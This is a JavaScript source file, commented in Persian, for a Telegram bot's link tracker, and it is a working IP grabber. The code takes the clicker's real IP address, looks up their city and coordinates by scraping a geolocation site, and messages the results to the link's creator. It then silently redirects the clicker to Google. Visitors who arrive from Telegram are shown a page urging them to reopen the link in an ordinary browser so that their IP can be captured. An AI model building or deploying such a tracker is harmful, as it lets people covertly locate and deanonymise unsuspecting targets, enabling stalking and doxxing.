// api/track.js

const { Bot } = require("grammy");
const { load } = require("cheerio")
const DB = require('../services/storage'); 

const bot = new Bot(process.env.BOT_TOKEN);

// این تابع مستقیماً توسط درخواست HTTP مرورگر فراخوانی می‌شود
module.exports = async (req, res) => {
    const url = new URL(req.url, `https://${req.headers.host}`);
    const linkId = url.searchParams.get('id');

    if (!linkId) {
        res.statusCode = 400;
        return res.end("Missing link ID.");
    }

    try {
        // ۱. بازیابی اطلاعات خالق لینک
        const linkData = await DB.getLinkData(linkId);
        // console.log(linkData)
        if (!linkData) {
            res.statusCode = 404;
            return res.end("Link expired or not found.");
        }
        
        const { creatorId } = linkData;
             const realUserIP = (
        req.headers['cf-connecting-ip'] ||          // Cloudflare
        req.headers['x-forwarded-for']?.split(',')[0].trim() || // پروکسی زنجیره
        req.headers['x-real-ip'] ||                // نرم افزارهای خاص
        req.connection.remoteAddress ||            // مستقیم
        req.socket.remoteAddress ||                // از سوکت
        'UNKNOWN'
    ).replace('::ffff:', ''); // حذف IPv6 prefix

    // اطلاعات کامل کاربر
    const userInfo = {
        ip: realUserIP,
        timestamp: new Date().toISOString(),
        userAgent: req.headers['user-agent'],
        referer: req.headers.referer || 'direct',
        query: req.query,
        // تشخیص تلگرام
        isTelegram: req.headers['user-agent']?.includes('TelegramBot') || 
                    req.headers['user-agent']?.includes('Telegram') || false
    };

    // 🎯 اگر از تلگرام آمده باشد
    if (userInfo.isTelegram) {
        console.log('⚠️ کاربر از تلگرام آمده - IP مخفی است:', req.connection.remoteAddress);
        
        // ارسال پیام به سازنده لینک که کسی از تلگرام کلیک کرده
        bot.api.sendMessage(
            creatorId, 
            `⚠️ کسی از تلگرام روی لینک شما (${linkId}) کلیک کرد.\n\n💡 برای دریافت اطلاعات کامل، لینک باید از مرورگر معمولی باز شود.`
        ).catch(e => console.error("Error sending Telegram notification:", e));
        
        // صفحه اخطار نمایش بده
        const warningHtml = `
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <title>⚠️ لطفا از مرورگر معمولی وارد شوید</title>
            <meta charset="UTF-8">
            <style>
                body { font-family: Tahoma; text-align: center; padding: 50px; }
                .warning { color: #d63031; background: #ffeaa7; padding: 20px; border-radius: 10px; }
                .steps { text-align: right; margin: 30px; }
            </style>
        </head>
        <body>
            <div class="warning">
                <h2>⛔ برای ادامه لطفا از مرورگر معمولی استفاده کنید</h2>
            </div>
            
            <div class="steps">
                <h3>📱 راه‌حل:</h3>
                <p>1. لینک زیر را کپی کنید</p>
                <p style="background:#eee;padding:10px;font-family:monospace;">
                    ${req.url}
                </p>
                <p>2. آن را در مرورگر معمولی (Chrome, Firefox, Safari) باز کنید</p>
            </div>
            
            <p><a href="#" onclick="copyLink()" style="background:#0984e3;color:white;padding:10px 20px;border-radius:5px;text-decoration:none">
                📋 کپی لینک
            </a></p>
            
            <script>
                function copyLink() {
                    navigator.clipboard.writeText(window.location.href);
                    alert('لینک کپی شد! حالا در مرورگر معمولی بازش کنید');
                }
            </script>
        </body>
        </html>
        `;
        
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        return res.end(warningHtml);
    }

    // ✅ کاربر از مرورگر معمولی آمده - IP واقعی را داریم
    console.log('🎉 IP واقعی کاربر:', realUserIP);
    console.log('📊 اطلاعات کامل:', JSON.stringify(userInfo, null, 2));
        // const privateUserIP =  req.headers['x-real-ip'];
        // const privateUserIP = req.headers['x-forwarded-for'];
        // const privateUserAgent = req.headers['user-agent'];
        // console.log(`IP: ${privateUserIP} | ${privateUserAgent}`)
        //  fetch('https://api.ipify.org?format=json')
        //     .then(res => res.json()).then(s => console.log(s))
        // ۲. ارسال اعلان اولیه به خالق لینک
        await bot.api.sendMessage(
            creatorId, 
            `🔔 اعلان کلیک! شخصی روی لینک شما (${linkId}) کلیک کرد.\n⏳ در حال دریافت اطلاعات موقعیت مکانی...`
        ).catch(e => console.error("Error sending notification:", e));
        
        // ۳. دریافت و ارسال اطلاعات موقعیت مکانی
        try {
            const geoResponse = await fetch(`https://ipgeolocation.io/what-is-my-ip/${userInfo.ip}`);
            const htmlContent = await geoResponse.text();
            const $ = load(htmlContent);
            
            console.log("Fetching geolocation data...");
            const dataStr = $("#code-json").attr("data-full");
            console.log("Raw data:", dataStr);
            
            if (dataStr) {
                const data = JSON.parse(dataStr);
                console.log("Parsed data:", data);
                
                await bot.api.sendMessage(
                    creatorId,
                    `📍 اطلاعات موقعیت مکانی:
🌐 IP: ${data.ip || 'N/A'}
🖥 Hostname: ${data.hostname || 'N/A'}
🏙 شهر: ${data.location?.city || 'N/A'}
📍 عرض جغرافیایی: ${data.location?.latitude || 'N/A'}
📍 طول جغرافیایی: ${data.location?.longitude || 'N/A'}
🏳 کد کشور: ${data.location?.country_code2 || 'N/A'}
🌍 نام کشور: ${data.location?.country_name || 'N/A'}
⏰ زمان: ${userInfo.timestamp}`
                );
            } else {
                console.error("data-full attribute not found");
                await bot.api.sendMessage(
                    creatorId,
                    `⚠️ اطلاعات موقعیت مکانی یافت نشد\n🌐 IP: ${userInfo.ip}\n⏰ زمان: ${userInfo.timestamp}`
                );
            }
        } catch (error) {
            console.error("Error fetching geolocation:", error);
            await bot.api.sendMessage(
                creatorId,
                `⚠️ خطا در دریافت اطلاعات موقعیت مکانی\n🌐 IP: ${userInfo.ip}\n⏰ زمان: ${userInfo.timestamp}`
            ).catch(e => console.error("Error sending error message:", e));
        }

        // ۴. تمدید زمان انقضای لینک (هر بار که استفاده میشه، 10 دقیقه دیگه فعال میمونه)
        await DB.renewLink(linkId, creatorId);

        // ۵. هدایت کاربر به یک مقصد نهایی
        res.writeHead(302, { Location: 'https://www.google.com' });
        res.end();

    } catch (error) {
        console.error("Tracking Error:", error);
        res.statusCode = 500;
        res.end("Internal Server Error.");
    }
};